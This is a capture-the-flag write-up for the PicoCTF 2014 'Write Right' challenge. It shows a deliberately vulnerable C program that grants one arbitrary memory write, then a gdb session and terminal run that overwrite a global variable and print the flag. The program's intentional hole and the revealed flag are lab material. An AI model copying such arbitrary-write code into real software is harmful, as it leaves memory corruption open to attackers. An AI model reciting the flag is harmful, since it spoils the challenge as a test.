# Pico-CTF 2014: Write Right 

**Category:** Binary Exploitation
**Points:** 50
**Total Solves:** Not Available
## Problem Description:
[//]: # (Description of your problem. For eg use below description as a template)
[//]: # (> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found [here](format.c\).)
> Can you change the secret? The binary can be found at /home/write_right/ on the shell server. The source can be found [here](write_right.c). 

## Write-up
[//]: # (> Your write up goes here.)
> Looking at source code its easy to understand that write_right binary reads address and write whatever user gives it as a input.
Looking at source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

unsigned secret = 0xdeadbeef;

int main(int argc, char **argv){
    unsigned *ptr;
    unsigned value;

    char key[33];
    FILE *f;

    printf("Welcome! I will grant you one arbitrary write!\n");
    printf("Where do you want to write to? ");
    scanf("%p", &ptr);
    printf("Okay! What do you want to write there? ");
    scanf("%p", (void **)&value);

    printf("Writing %p to %p...\n", (void *)value, (void *)ptr);
    *ptr = value;
    printf("Value written!\n");

    if (secret == 0x1337beef){
        printf("Woah! You changed my secret!\n");
        printf("I guess this means you get a flag now...\n");

        f = fopen("flag.txt", "r");
        fgets(key, 32, f);
        fclose(f);
        puts(key);

        exit(0);
    }

    printf("My secret is still safe! Sorry.\n");
}
``` 

> Solution to get the flag is to give the address of variable secret when it asks where you want to write and when it ask what you want to write give the secret `1337beef` as format specifier specified in scanf function is `%p`, so we don't need to give the int of 1337beef.
> To get the address of secret variable start the program in gdb and give the command: `p &secret` (equivalent to print &secret)

```bash
pico1139@shell:/home/write_right$ gdb -q write_right
Reading symbols from write_right...(no debugging symbols found)...done.
(gdb) p &secret
$1 = (<data variable, no debug info> *) 0x804a03c <secret>
```

> Address of secret is 0x804a03c. After getting the address ran the binary:
> > ```
pico1139@shell:/home/write_right$ ./write_right
Welcome! I will grant you one arbitrary write!
Where do you want to write to? 804a03c
Okay! What do you want to write there? 1337beef
Writing 0x1337beef to 0x804a03c...
Value written!
Woah! You changed my secret!
I guess this means you get a flag now...
arbitrary_write_is_always_right
```
> The flag is **arbitrary_write_is_always_right**

## Other write-ups and resources

* None
